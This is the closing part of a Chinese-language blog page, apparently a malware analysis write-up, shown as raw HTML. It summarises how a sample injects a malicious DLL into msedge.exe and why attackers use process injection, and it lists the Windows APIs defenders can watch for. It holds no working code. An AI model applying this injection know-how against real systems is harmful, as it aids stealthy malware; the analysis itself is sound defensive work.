<a class=anchor href=#%e5%b0%8f%e7%af%80>#</a></h2><p>至此，我們已經把主要程式都分析完了，大略流程如下</p><blockquote><p><img src=https://hackmd.io/_uploads/Hy5zvDpG6.png alt></p></blockquote><p>主要是後面的部分比較難分析，駭客主要的目的是把有問題的DLL file注入到<code>msedge.exe</code>這個process中並且建立一個thread，然後從<code>my_start</code>這個導出函數開始執行一些操作，這樣一個完整的流程就叫做==Process Injection==</p><h3 id=這樣繞一大圈的用途>這樣繞一大圈的用途
<a class=anchor href=#%e9%80%99%e6%a8%a3%e7%b9%9e%e4%b8%80%e5%a4%a7%e5%9c%88%e7%9a%84%e7%94%a8%e9%80%94>#</a></h3><ul><li>不會建立獨立的 process，而是把惡意行為隱藏在正常 process 中，以躲避 process 級別的偵測</li><li>若能注入高權限 process，則有機會提權</li></ul><h3 id=防禦手法>防禦手法
<a class=anchor href=#%e9%98%b2%e7%a6%a6%e6%89%8b%e6%b3%95>#</a></h3><ul><li>常用 API：VirtualAllocEx、WriteProcessMemory、CreateRemoteThread</li><li>一般程式較少對其他 process 做寫入和建立 thread，使用這些 API 十分容易被偵測</li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#小節>小節</a><ul><li><a href=#這樣繞一大圈的用途>這樣繞一大圈的用途</a></li><li><a href=#防禦手法>防禦手法</a></li></ul></li></ul></nav></div></aside></main></body></html>